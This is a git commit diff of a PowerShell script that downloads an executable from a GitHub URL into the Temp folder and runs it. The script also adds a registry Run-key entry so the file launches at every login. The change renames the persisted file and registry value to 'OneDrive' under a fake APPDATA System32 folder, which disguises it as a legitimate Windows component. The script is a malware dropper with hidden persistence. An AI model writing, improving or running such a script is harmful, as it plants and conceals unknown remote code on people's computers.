645d289031467414b1b41974e024544ca7b13837
WindowsEnjoyer-1 <being2269@gmail.com>
2025-02-08 13:27:01 -0800

    Update Am.ps1

--- Am.ps1
+++ Am.ps1
@@ -3,7 +3,7 @@ $url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/Run
 $output = "$env:Temp/RuntimeBroker.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
-$exePath = "$env:APPDATA\SubDir\Runtime broker.exe"
+$exePath = "$env:APPDATA\System32\OneDrive.exe"
 $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regValueName = "RuntimeBroker"
+$regValueName = "OneDrive"
 Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value $exePath
